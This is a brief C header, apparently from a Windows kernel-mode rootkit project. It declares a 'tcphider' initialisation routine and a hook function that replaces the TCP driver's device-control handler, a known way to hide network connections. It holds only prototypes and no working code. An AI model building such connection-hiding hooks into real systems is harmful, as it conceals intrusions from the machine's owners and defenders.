#pragma once

#include <ntddk.h>

typedef NTSTATUS (*IRP_MJ_Device_Control_t)(IN PDEVICE_OBJECT old_irp_mj_device_control,
                                            IN PIRP irp);

int tcphider_init();

NTSTATUS tcp_hook_function(IN PDEVICE_OBJECT device_object,
                           IN PIRP irp);


